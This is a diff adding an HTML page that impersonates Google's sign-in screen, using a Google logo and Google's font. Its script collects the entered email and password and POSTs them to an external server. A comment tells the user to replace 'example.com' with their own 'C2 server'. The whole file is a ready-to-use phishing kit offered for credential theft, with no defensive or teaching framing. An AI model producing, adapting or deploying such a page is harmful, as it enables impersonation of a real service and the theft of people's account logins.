@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to your Google account</title>
+    <link href="https://fonts.cdnfonts.com/css/product-sans" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Product Sans', sans-serif;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fcdn1.iconfinder.com%2Fdata%2Ficons%2Flogos-brands-in-colors%2F544%2FGoogle__G__Logo-1024.png&f=1&nofb=1&ipt=7517707b4fd748ec5deba9ecab5ecebdf4e5023138f8f0bbd32792102747a4e6" width="60" height="60">
+    <h1>Sign In</h1><br>
+    <p>Use your Google account</p>
+    <form id="loginForm">
+        <input type="email" placeholder="Email or Phone" id="email" required><br>
+        <input type="password" placeholder="Password" id="password" required><br>
+        <p id="error" style="color: red;"></p><br>
+        <button type="submit">Login</button><br>
+        <a href="">Forgot email?</a>
+    </form>
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            if (!email || !password) {
+                document.getElementById("error").innerHTML = "Please fill in both fields.";
+                return;
+            }
+
+            document.getElementById("error").innerHTML = "";
+
+            fetch('example.com', { //IMPORTANT!!! Add your C2 server/ server! DO NOT USE EXAMPLE.COM
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email: email, password: password })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Login successful!");
+                } else {
+                    document.getElementById("error").innerHTML = "Invalid credentials!";
+                }
+            })
+            .catch(error => {
+                document.getElementById("error").innerHTML = "Ooops something went wrong!";
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
